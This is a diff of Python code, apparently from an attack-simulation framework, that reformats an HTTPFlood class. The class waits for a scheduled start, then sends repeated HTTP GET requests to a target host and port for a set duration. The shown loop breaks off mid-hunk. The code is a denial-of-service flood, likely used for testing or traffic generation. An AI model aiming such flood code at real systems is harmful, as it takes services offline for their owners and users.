@@ -22,30 +22,31 @@ import time
 import socket
 from attacks.attack import Attack
 
+
 class HTTPFlood(Attack):
     """Send repeated HTTP-GET requests until *duration* seconds have elapsed."""
-    
+
     USER_AGENT = "HttpFlood/1.0"
-    
+
     # ------------------------------------------------------------------ #
     def execute(self) -> None:
-        
+
         self.wait_until_start()
-        port       = self.parameters.get("target_port", 80)
-        duration   = self.parameters.get("duration", 10)
-        path       = self.parameters.get("path", "/")
+        port = self.parameters.get("target_port", 80)
+        duration = self.parameters.get("duration", 10)
+        path = self.parameters.get("path", "/")
         read_reply = self.parameters.get("read_reply", False)
 
         self._http_flood(self.target_ip, port, duration, path, read_reply)
 
     # ------------------------------------------------------------------ #
     @staticmethod
-    def _http_flood(host: str,port: int,duration: int,path: str,read_reply: bool) -> None:
+    def _http_flood(host: str, port: int, duration: int, path: str, read_reply: bool) -> None:
         deadline = time.time() + duration
-        request  = (f"GET {path} HTTP/1.1\r\n"f"Host: {host}\r\n"
-            f"User-Agent: {HTTPFlood.USER_AGENT}\r\n"
-            "Connection: close\r\n\r\n"
-        ).encode()
+        request = (f"GET {path} HTTP/1.1\r\n"f"Host: {host}\r\n"
+                   f"User-Agent: {HTTPFlood.USER_AGENT}\r\n"
+                   "Connection: close\r\n\r\n"
+                   ).encode()
 
         while time.time() < deadline:
             try:
